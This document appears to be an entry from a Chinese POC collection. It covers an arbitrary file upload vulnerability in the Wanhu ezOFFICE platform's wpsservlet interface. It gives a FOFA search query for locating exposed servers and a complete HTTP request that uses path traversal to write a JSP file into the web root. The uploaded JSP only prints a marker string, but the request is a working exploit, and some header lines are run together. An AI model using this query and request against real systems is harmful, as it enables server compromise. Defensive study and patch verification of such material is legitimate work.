## 万户ezoffice wpsservlet任意文件上传漏洞

>万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。

## 来源

[https://github.com/wy876/POC](https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7ezoffice%20wpsservlet%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)

## 简介

万户ezOFFICE协同管理平台wpsservlet接口存在任意文件上传。攻击者可上传恶意脚本文件获取服务器权限。

## 漏洞类型

任意文件上传

## 网络绘测

### fofa

```
app="ezOFFICE协同管理平台"
```

## POC

```http
POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=apoxkq&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Content-Length: 173Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Connection: close
Content-Type: multipart/form-data; boundary=ufuadpxathqvxfqnuyuqaozvseiueerpDNT: 1
Upgrade-Insecure-Requests: 1

--ufuadpxathqvxfqnuyuqaozvseiueerp
Content-Disposition: form-data; name="NewFile"; filename="apoxkq.jsp"

<% out.print("sasdfghjkj");%>
--ufuadpxathqvxfqnuyuqaozvseiueerp--
```

